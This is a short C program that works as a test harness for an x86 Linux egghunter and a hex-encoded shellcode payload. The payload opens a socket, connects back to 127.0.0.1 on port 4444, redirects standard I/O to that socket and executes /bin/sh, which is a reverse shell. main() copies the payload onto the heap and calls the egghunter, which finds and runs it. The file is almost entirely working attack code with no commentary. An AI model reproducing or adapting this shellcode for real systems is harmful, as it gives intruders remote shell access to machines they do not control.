#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x50\x90\x50\x90"

unsigned char egghunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
"\x3c\xf2\x74\xee\xb8"
EGG
"\x89\xd7\xaf\x75\xe9\xaf\x75"
"\xe6\xff\xe7";

unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2"
"\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1"
"\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{
    int shellcode_len = strlen(shellcode);
    printf("Egghunter Length:  %d\n", strlen(egghunter));
    printf("Shellcode Length:  %d\n", shellcode_len);

    // Create a buffer to place our shellcode
    char *badbuffer;
    badbuffer=malloc(shellcode_len);
    memcpy(badbuffer,shellcode,shellcode_len);

	int (*ret)() = (int(*)())egghunter;
	ret();

    free(badbuffer);

}
